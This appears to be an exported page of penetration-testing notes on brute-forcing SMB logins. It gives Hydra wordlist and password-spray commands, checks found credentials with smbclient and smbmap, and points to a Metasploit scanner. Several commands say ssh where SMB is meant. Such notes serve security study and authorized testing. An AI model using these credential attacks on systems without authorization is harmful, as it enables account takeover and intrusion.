<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>smb (TCP:139,445)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>smb (TCP:139,445)</h1><br /><br /><br />
    <div class="codebox">
      <div class="codebox">
        hydra&nbsp;-L&nbsp;/root/Desktop/user.txt&nbsp;-P&nbsp;/root/Desktop/pass.txt&nbsp;192.168.1.118&nbsp;smb</div>
    </div><br /><br /><span style="color:#ff0000;">WARNING</span>: if you have tried with Hydra but you got this
    error:<br /> <a href=""><img src="images/1438-1.png" alt="images/1438-1.png" /></a><br /> while you know through
    nmap that the port 445 is open try with the MSF module <strong> </strong><a
      href="--Penetration_Test_Methodology--Network_Pentest--Vulnerability_assessment--Manual_Testing--NetBIOS,_SMB--BruteForce_Username_and_Password.html">auxiliary/scanner/smb/smb_login</a><br /><br />As
    we can see ssh module has not specific parameters that we have to set<br />
    <div class="codebox">
      <div class="codebox">hydra&nbsp;smb&nbsp;-U</div>
    </div><br /> <a href=""><img src="images/1438-2.png" alt="images/1438-2.png" /></a><br /><br />1. Execute
    Hydra<br />
    <div class="codebox">
      <div class="codebox">
        hydra&nbsp;-L&nbsp;usernamesFile.usr&nbsp;-P&nbsp;passwordsFile.txt&nbsp;smb://&lt;server&gt;&nbsp;-V&nbsp;|&amp;&nbsp;tee&nbsp;output.txt
      </div>
    </div><br /> ◇ -L usernamesFile.usr → wordlist of usernames<br /> ◇ -P passwordsFile.txt → wordlist of
    passwords<br /> ◇ -p &lt;password&gt; → usually for a Password Spray attack<br /> ◇ smb://&lt;server&gt; → ssh is
    the service, &lt;server&gt; is the target: DNS, IP or 192.168.0.0/24 (this or the -M option)<br /> ◇ -V →
    verbose<br /> ◇ -f / -F → exit when a login/pass pair is found (-M: -f per host, -F global) <br /> ◇ |&amp; tee
    output.txt → the output will be displayed on the screen and also redirected on file<br /><br />2. from the output
    file to see only the valid credentials<br />
    <div class="codebox">
      <div class="codebox">cat&nbsp;output.txt&nbsp;|&nbsp;grep&nbsp;smb</div>
    </div><br /><br />3. verify credentials with a login <br /> ◇ smbclient<br />
    <div class="codebox">
      <div class="codebox">
        smbclient&nbsp;//&lt;address&gt;&nbsp;-U=user%password&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#Linux&nbsp;target<br />smbclient&nbsp;\\\\&lt;address&gt;&nbsp;-U=user%password&nbsp;&nbsp;#Windows&nbsp;target
      </div>
    </div><br /> ◇ smbmap(kali linux repo, <a href="https://github.com/ShawnDEvans/smbmap" target="_blank">github repo</a>)<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;smbmap&nbsp;-u&nbsp;&lt;username&gt;&nbsp;-p&nbsp;&lt;password&gt;&nbsp;-d&nbsp;&lt;domain&gt;&nbsp;-H&nbsp;<span
          style="color:#000000;font-weight:400">&lt;</span>host<span style="color:#000000;font-weight:400">&gt;</span>
      </div>
    </div><br /> <a href=""><img src="images/1438-3.png" alt="images/1438-3.png" /></a><br /><br /><br /><strong>
      <h3>Password Spray</h3>
    </strong><br />• Check <span style="text-decoration:underline;">multiple usernames</span> <br />
    <div class="codebox">
      <div class="codebox">
        hydra&nbsp;-L&nbsp;usernamesFile.usr&nbsp;-p&nbsp;[password]&nbsp;ssh://&lt;server&gt;&nbsp;-V&nbsp;|&amp;&nbsp;tee&nbsp;output.txt
      </div>
    </div><br />• Check <span style="text-decoration:underline;">multiple Servers</span><br />
    <div class="codebox">
      <div class="codebox">
        hydra&nbsp;-l&nbsp;[username]&nbsp;-P&nbsp;[password]&nbsp;-M&nbsp;ssh_servers.txt&nbsp;ssh&nbsp;|&amp;&nbsp;tee&nbsp;output.txt
      </div>
    </div><br /> alternative with Metasploit module <strong>smb_login Check Scanner</strong><br /> <a
      href="https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_login/" target="_blank">https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_login/</a><br />
  </div>
</body>

</html>